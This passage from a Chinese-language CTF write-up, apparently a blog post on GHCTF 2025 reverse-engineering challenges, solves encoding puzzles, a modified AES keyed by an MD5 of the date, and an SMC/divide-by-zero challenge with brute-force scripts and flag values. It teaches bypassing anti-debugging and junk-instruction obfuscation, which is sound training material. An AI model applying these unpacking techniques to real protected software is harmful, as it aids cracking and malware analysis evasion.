class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_encrypt</span>(<span class="params">text, shift</span>):</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)))</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;0&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">            result.append(<span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) - shift) % <span class="number">10</span> + <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(char)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base85_decode</span>(<span class="params">encoded_text</span>):</span><br><span class="line">    byte_data = encoded_text.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    decoded = base64.a85decode(byte_data)</span><br><span class="line">    <span class="keyword">return</span> decoded.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base45_decode_custom</span>(<span class="params">data: <span class="built_in">str</span></span>):</span><br><span class="line">    decoded = <span class="built_in">bytearray</span>()</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    chars = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">93</span>)])</span><br><span class="line">    char_to_val = &#123;ch: i <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(chars)&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        <span class="keyword">if</span> i + <span class="number">2</span> &lt; <span class="built_in">len</span>(data):</span><br><span class="line">            num = (char_to_val[data[i + <span class="number">2</span>]] * <span class="number">45</span> * <span class="number">45</span> +</span><br><span class="line">                    char_to_val[data[i + <span class="number">1</span>]] * <span class="number">45</span> +</span><br><span class="line">                    char_to_val[data[i]])</span><br><span class="line">            decoded.append(num &gt;&gt; <span class="number">8</span>)</span><br><span class="line">            decoded.append(num &amp; <span class="number">0xFF</span>)</span><br><span class="line">            i += <span class="number">3</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = (char_to_val[data[i + <span class="number">1</span>]] * <span class="number">45</span> +</span><br><span class="line">                    char_to_val[data[i]])</span><br><span class="line">            decoded.append(num)</span><br><span class="line">            i += <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> decoded.decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    enc = <span class="built_in">bytes</span>([<span class="number">57</span>, <span class="number">118</span>, <span class="number">33</span>, <span class="number">114</span>, <span class="number">68</span>, <span class="number">56</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">34</span>, <span class="number">52</span>, <span class="number">52</span>, <span class="number">95</span>, <span class="number">78</span>, <span class="number">40</span>, <span class="number">49</span>, <span class="number">59</span>, <span class="number">95</span>, <span class="number">85</span>, <span class="number">63</span>, <span class="number">122</span>, <span class="number">54</span>, <span class="number">33</span>, <span class="number">77</span>, <span class="number">110</span>, <span class="number">49</span>, <span class="number">54</span>, <span class="number">34</span>, <span class="number">109</span>, <span class="number">106</span>, <span class="number">122</span>, <span class="number">60</span>, <span class="number">92</span>, <span class="number">108</span>, <span class="number">91</span>, <span class="number">61</span>, <span class="number">51</span>, <span class="number">42</span>, <span class="number">62</span>, <span class="number">35</span>, <span class="number">38</span>, <span class="number">52</span>, <span class="number">67</span>, <span class="number">62</span>, <span class="number">122</span>, <span class="number">116</span>, <span class="number">48</span>, <span class="number">76</span>, <span class="number">50</span>, <span class="number">67</span>, <span class="number">51</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">122</span>, <span class="number">45</span>, <span class="number">45</span>, <span class="number">51</span>, <span class="number">90</span>])</span><br><span class="line">    </span><br><span class="line">    p1 = caesar_encrypt(enc.decode(),-<span class="number">9</span>)</span><br><span class="line">    p2 = base85_decode(p1)</span><br><span class="line">    p3 = caesar_encrypt(p2,-<span class="number">7</span>)</span><br><span class="line">    flag = base45_decode_custom(p3)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="Flag值-3"><a href="#Flag值-3" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;Th3y&#39;r3_a11_p1aY_Ba5e!&#125;</code></p><h2 id="TimeSpaceRescue"><a href="#TimeSpaceRescue" class="headerlink" title="TimeSpaceRescue"></a>TimeSpaceRescue</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>这题考点是反调试、花指令、时间爆破、AES魔改。</p><p>AES魔改的地方很明显，对比标准算法代码就可以马上找出，就多调用了两个函数对Key和加密数据进行了变换。</p><p>IDA反编译main函数，发现使用一个函数生成了一个数据，然后将生成数据与输入内容传入到加密函数内加密，最后比对。</p><p><img src="/2025/03/06/GHCTF2025WP/22.png" alt="alt text"></p><p>进入生成数据函数中，可以看到反调试代码，核心逻辑是获取当前时间。</p><p>时间结构体如下，可以看到使用memcpy将tm_mday开始往后三个整数数值复制到Src数组中，也就是复制了day、month、year数据。</p><p>然后调用sub_4021A0利用复制的时间数据生成16字节数据，可以观察得知sub_4021A0是MD5函数，如果不知道的话也可以直接把代码抠出来进行调用。</p><p>最后将MD5得到的字节都异或上0x14。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">tm</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> tm_sec;  <span class="comment">/*秒，正常范围0-59， 但允许至61*/</span></span><br><span class="line">    <span class="type">int</span> tm_min;  <span class="comment">/*分钟，0-59*/</span></span><br><span class="line">    <span class="type">int</span> tm_hour; <span class="comment">/*小时， 0-23*/</span></span><br><span class="line">    <span class="type">int</span> tm_mday; <span class="comment">/*日，即一个月中的第几天，1-31*/</span></span><br><span class="line">    <span class="type">int</span> tm_mon;  <span class="comment">/*月， 从一月算起，0-11*/</span></span><br><span class="line">    <span class="type">int</span> tm_year; <span class="comment">/*年， 从1900至今已经多少年*/</span></span><br><span class="line">    <span class="type">int</span> tm_wday; <span class="comment">/*星期，一周中的第几天， 从星期日算起，0-6*/</span></span><br><span class="line">    <span class="type">int</span> tm_yday; <span class="comment">/*从今年1月1日到目前的天数，范围0-365*/</span></span><br><span class="line">    <span class="type">int</span> tm_isdst;<span class="comment">/*日光节约时间的旗标*/</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/GHCTF2025WP/23.png" alt="alt text"></p><p>这边看到函数结尾return 39有点奇怪，转到这个函数汇编界面，会发现函数底部有个花指令。</p><p>这边花指令的原理是二次计算，call完第一次计算结果不等于目标值，函数返回后还是从计算地址指令开始执行，进行了第二次计算，此时计算结果等于目标值进行jz跳转，用二次计算误导IDA认为该部分会直接ret而不会jz跳转执行下面部分命令。</p><p><img src="/2025/03/06/GHCTF2025WP/24.png" alt="alt text"></p><p>将红框内汇编nop掉，重新反编译会发现函数尾部又多了一次异或加密。</p><p>所以这边的密钥生成就是利用当前时间的年月日数据进行MD5，然后进行两次的异或计算得到最终的16字节密钥，结合题目描述，应该是需要爆破时间来得到有效密钥。</p><p><img src="/2025/03/06/GHCTF2025WP/25.png" alt="alt text"></p><p>接下来分析AES加密函数，发现函数尾部return 39，返回汇编解密，发现同样函数尾部有花指令。</p><p><img src="/2025/03/06/GHCTF2025WP/26.png" alt="alt text"></p><p>nop后就会发现尾部有个异或0x11的操作，跳到那个全部byte的交叉调用函数，发现是反调试，如果检测到调试，AES加密尾部就会把加密的数据再进行异或0x11处理，进行数据混淆。</p><p><img src="/2025/03/06/GHCTF2025WP/27.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/28.png" alt="alt text"></p><p>通过比对标准算法队函数进行命名，发现多了这三个非AES标准流程的函数，</p><p><img src="/2025/03/06/GHCTF2025WP/29.png" alt="alt text"></p><p>第一个函数是传入了密钥数据，将相邻两个字节两两互换并异或上5。第三个函数也是和第一个相同的，不过处理的是加密完的密文。</p><p><img src="/2025/03/06/GHCTF2025WP/30.png" alt="alt text"></p><p>第二个函数是将要进行加密的16字节明文字节数据前后翻转，并都异或上0xF。</p><p><img src="/2025/03/06/GHCTF2025WP/31.png" alt="alt text"></p><p>至此所有流程分析完毕，可以复制一份标准算法直接进行解密，不过需要手动调用那两个函数进行再次逆向处理，然后配合月日爆破（年份题目描述已给，2024年）。</p><p><strong>注：该程序在初始化会进行三个反调试函数的调用，一个是调用IsDebuggerPresent和CheckRemoteDebuggerPresent，一个是刚刚上文提到的给全局一个Byte赋值，最后一个是对当前进程遍历查找恶意进程，对反调试感兴趣的可以根据我提供的这些函数去反向查找自行处理试试看。</strong></p><p>解密代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;aes.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;md5.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Reverse</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title">sub_401030</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+0h] [ebp-Ch]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line">    <span class="type">char</span> v4; <span class="comment">// [esp+Bh] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">15</span>; ; --i)</span><br><span class="line">    &#123;</span><br><span class="line">        result = v3;</span><br><span class="line">        <span class="keyword">if</span> (v3 &gt;= i)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        v4 = *(BYTE*)(v3 + a1) ^ <span class="number">0xF</span>;</span><br><span class="line">        *(BYTE*)(v3 + a1) = *(BYTE*)(i + a1) ^ <span class="number">0xF</span>;</span><br><span class="line">        *(BYTE*)(i + a1) = v4;</span><br><span class="line">        ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SwapPairs</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title">sub_4010A0</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+0h] [ebp-8h]</span></span><br><span class="line">    <span class="type">char</span> v3; <span class="comment">// [esp+7h] [ebp-1h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i += <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        v3 = *(BYTE*)(i + a1) ^ <span class="number">5</span>;</span><br><span class="line">        *(BYTE*)(i + a1) = *(BYTE*)(i + a1 + <span class="number">1</span>) ^ <span class="number">5</span>;</span><br><span class="line">        *(BYTE*)(i + a1 + <span class="number">1</span>) = v3;</span><br><span class="line">        result = i + <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> month = <span class="number">0</span>; month &lt; <span class="number">12</span>; month++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> day = <span class="number">1</span>; day &lt;= <span class="number">31</span>; day++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">uint8_t</span> EncFlag[] =</span><br><span class="line">            &#123; </span><br><span class="line">                <span class="number">0xCD</span>,<span class="number">0x16</span>,<span class="number">0xDB</span>,<span class="number">0xB5</span>,<span class="number">0xD1</span>,<span class="number">0x02</span>,<span class="number">0xA4</span>,<span class="number">0x82</span>,<span class="number">0x8E</span>,<span class="number">0x59</span>,</span><br><span class="line">                <span class="number">0x73</span>,<span class="number">0x9E</span>,<span class="number">0x96</span>,<span class="number">0x26</span>,<span class="number">0x56</span>,<span class="number">0xF2</span>,<span class="number">0x16</span>,<span class="number">0x8E</span>,<span class="number">0x46</span>,<span class="number">0xF2</span>,</span><br><span class="line">                <span class="number">0x55</span>,<span class="number">0x7B</span>,<span class="number">0x92</span>,<span class="number">0x31</span>,<span class="number">0x30</span>,<span class="number">0xDC</span>,<span class="number">0xAA</span>,<span class="number">0x8A</span>,<span class="number">0xF3</span>,<span class="number">0x1C</span>,</span><br><span class="line">                <span class="number">0xA0</span>,<span class="number">0xAA</span> </span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="type">uint8_t</span> Key[<span class="number">16</span>]&#123;&#125;;</span><br><span class="line">            <span class="type">int</span> TimeData[]&#123; day,month,<span class="number">2024</span> - <span class="number">1900</span> &#125;;</span><br><span class="line">            <span class="built_in">md5</span>((<span class="type">uint8_t</span>*)TimeData, <span class="number">12</span>, Key);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">                *(Key + i) = (Key[i] ^ <span class="number">0x114</span>) % <span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">                *(Key + i) = (Key[i] ^ <span class="number">0x11</span>) % <span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// swap key</span></span><br><span class="line">            <span class="built_in">sub_4010A0</span>((<span class="type">int</span>)Key);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// swap encData</span></span><br><span class="line">            <span class="built_in">sub_4010A0</span>((<span class="type">int</span>)EncFlag);</span><br><span class="line">            <span class="built_in">sub_4010A0</span>((<span class="type">int</span>)(EncFlag + <span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">            <span class="comment">// decrypt</span></span><br><span class="line">            <span class="built_in">aesDecrypt</span>(Key, <span class="number">16</span>, EncFlag, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// reverse encData</span></span><br><span class="line">            <span class="built_in">sub_401030</span>((<span class="type">int</span>)EncFlag);</span><br><span class="line">            <span class="built_in">sub_401030</span>((<span class="type">int</span>)(EncFlag + <span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (EncFlag[<span class="number">0</span>] == <span class="string">&#x27;N&#x27;</span></span><br><span class="line">                &amp;&amp; EncFlag[<span class="number">1</span>] == <span class="string">&#x27;S&#x27;</span></span><br><span class="line">                &amp;&amp; EncFlag[<span class="number">2</span>] == <span class="string">&#x27;S&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, EncFlag);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Flag值-4"><a href="#Flag值-4" class="headerlink" title="Flag值"></a>Flag值</h3><p><code>NSSCTF&#123;W0w_Y0u&#39;re_@n_AE5_M@5t3r&#125;</code></p><h2 id="Room-0"><a href="#Room-0" class="headerlink" title="Room 0"></a>Room 0</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>这题出的时候也是突发奇想，想把SMC和异常两个考点结合起来，于是出了一个这样强技巧性的题目，如果选手没有意识到考点就没办法解出。后续放出了两个Hint指出了是除0异常和SMC特性，题解就猛涨了（，技巧性确实会强一点。</p><p>IDA分析main函数，发现有个CPPEH_RECORD的异常结构体。</p><p><img src="/2025/03/06/GHCTF2025WP/32.png" alt="alt text"></p><p>回到汇编流程图会发现存在try和catch的捕获异常代码。</p><p><img src="/2025/03/06/GHCTF2025WP/33.png" alt="alt text"></p><p>将此处的jmp和ret都nop掉就可以在反编译代码段看到catch执行的代码部分。</p><p><img src="/2025/03/06/GHCTF2025WP/34.png" alt="alt text"></p><p>发现多了三个函数调用，就是catch部分执行的函数。</p><p><img src="/2025/03/06/GHCTF2025WP/35.png" alt="alt text"></p><p>第一个函数是经典的unhex函数（”1f2f”-&gt;0x1f2f）。</p><p><img src="/2025/03/06/GHCTF2025WP/36.png" alt="alt text"></p><p>第二个函数存在三处花指令，第一处和第三处直接全部nop，第二处对call按u，在跳过第一个字节按c重新分析下面部分代码，跳过0xE8字节。</p><p><img src="/2025/03/06/GHCTF2025WP/37.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/38.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/39.png" alt="alt text"></p><p>选中函数按P重新识别为函数进行反编译，发现这部分实际上就是SMC函数处，利用传进的密钥数据对.enc代码进行异或解密。</p><p>只不过传进的四字节整数密钥再函数开头做了字节倒序的处理，将四个字节顺序翻转，那么接下来任务就是找到密钥。</p><p><img src="/2025/03/06/GHCTF2025WP/40.png" alt="alt text"></p><p>回到main函数，发现程序要求输入key，然后调用一个call返回值要是0x11451419，然后利用0x11451419进行了一个RC4加密，最后对比一个字节数组，如果选手尝试解密这部分字节数组，会发现解出来的是FakeFlag。</p><p><code>NSSCTF&#123;FAKE_FAKE_FAKE_FAKE_FAKE&#125;</code></p><p><img src="/2025/03/06/GHCTF2025WP/41.png" alt="alt text"></p><p>进入sub_402000函数，可以看到是将输入的密钥调用unhex得到四字节数值，然后进行一个32轮的计算，在箭头处可以看到有一个除法计算，以及除数部分的一个变量与常数相减。</p><p>结合前面发现的异常捕获，可以知道这部分会有可能出现除数等于0，也就是触发除0异常。那么可以通过爆破的方式找到一个可以在计算过程中触发除0异常的值，那就是目标密钥了，因为SMC传入的密钥就是我们输入的密钥字串经过unhex的数据。</p><p><img src="/2025/03/06/GHCTF2025WP/42.png" alt="alt text"></p><p>但是经过实际检验，如果直接从0x0-0xffffffff爆破会出现非常多的符合值，无法确定哪个是真实密钥，就必须得缩小范围，这时会想到这个SMC加密函数存在特性，因为通过的是异或加密，所以可以根据原始字节与当前字节异或得到中间密钥。</p><p>跳到enc段开头，复制开头三个字节，然后随便找一个函数也复制开头三个字节，将两对数据进行异或，就会得到密钥的前三个字节。</p><p><img src="/2025/03/06/GHCTF2025WP/43.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/44.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/45.png" alt="alt text"></p><p>这下范围缩小至0x755ff000-0x755ff0ff之间，使用代码爆破即可得到密钥。</p><p>爆破代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">sub_4011C0</span><span class="params">(<span class="type">int</span> v2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// int v2&#123;&#125;;          // [esp+0h] [ebp-1Ch]</span></span><br><span class="line">    <span class="type">int</span> i&#123;&#125;;           <span class="comment">// [esp+4h] [ebp-18h]</span></span><br><span class="line">    <span class="type">int</span> v4&#123;&#125;;          <span class="comment">// [esp+8h] [ebp-14h]</span></span><br><span class="line">    <span class="type">int</span> v5&#123;&#125;;          <span class="comment">// [esp+Ch] [ebp-10h]</span></span><br><span class="line">    <span class="type">int</span> v6&#123;&#125;;          <span class="comment">// [esp+10h] [ebp-Ch]</span></span><br><span class="line">    <span class="type">int</span> v7&#123;&#125;;          <span class="comment">// [esp+10h] [ebp-Ch]</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v8&#123;&#125;; <span class="comment">// [esp+14h] [ebp-8h]</span></span><br><span class="line">    <span class="type">int</span> v9&#123;&#125;;          <span class="comment">// [esp+18h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// v2 = sub_401100(Str);</span></span><br><span class="line">    <span class="comment">// if (!v2)</span></span><br><span class="line">    <span class="comment">// return 0;</span></span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    v9 = v2;</span><br><span class="line">    v8 = (v2 &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    v5 = (v2 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    v4 = (v2 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        v7 = v6 * (v8 + <span class="number">1415881080</span>) * (v9 - <span class="number">1467486175</span>) * ((v8 - v9) ^ (v8 &gt;&gt; <span class="number">4</span>));</span><br><span class="line">        v5 = (v9 + v5) ^ (<span class="number">8</span> * v4);</span><br><span class="line">        v4 = (v9 + v8) ^ (<span class="number">8</span> * v5);</span><br><span class="line">        v8 = (v9 + v4) ^ (<span class="number">8</span> * v5);</span><br><span class="line">        v9 -= v4 + v5 + v8;</span><br><span class="line">        <span class="comment">// 若于1415881080相等，则会触发除0异常</span></span><br><span class="line">        <span class="keyword">if</span> (v9 == <span class="number">1415881080</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Key:%X\n&quot;</span>, v2);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v6 = v7 + (v8 + <span class="number">1467486175</span>) * (((v8 - v9) ^ (<span class="type">unsigned</span> __int64)(v8 &gt;&gt; <span class="number">4</span>)) / (<span class="type">unsigned</span> <span class="type">int</span>)(v9 - <span class="number">1415881080</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> v9 ^ v6;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0x755ff000</span>; i &lt; <span class="number">0x755ff0ff</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">sub_4011C0</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到密钥<code>755FF0D3</code></p><p>还原main函数nop的三行汇编，重新ida载入程序分析也可以，在异常except处断点，然后运行输入密钥，发现确实途中会触发div 0异常，然后断点会触发，</p><p><img src="/2025/03/06/GHCTF2025WP/46.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/47.png" alt="alt text"></p><p>单步执行完SMC函数解密函数，然后跳到enc段的函数进行按c还原代码。</p><p><img src="/2025/03/06/GHCTF2025WP/48.png" alt="alt text"></p><p>还原途中会发现几个花指令，和之前遇到的一样类型的，同样去除就好，最后选中函数按p识别为函数进行反编译即可。</p><p><img src="/2025/03/06/GHCTF2025WP/49.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/50.png" alt="alt text"></p><p>会发现是一个变种RC4，发现v18是RC4密钥，且最后加密完的值又与v18字节数组进行异或。</p><p><img src="/2025/03/06/GHCTF2025WP/51.png" alt="alt text"></p><p>v18不知道是什么数据，直接让代码执行到第一个for执行完处，就可以看到v18值，这8个字节就是密钥，编写代码将byte_405020字节数组进行解密即可得到密钥。</p><p><img src="/2025/03/06/GHCTF2025WP/52.png" alt="alt text"></p><p><img src="/2025/03/06/GHCTF2025WP/53.png" alt="alt 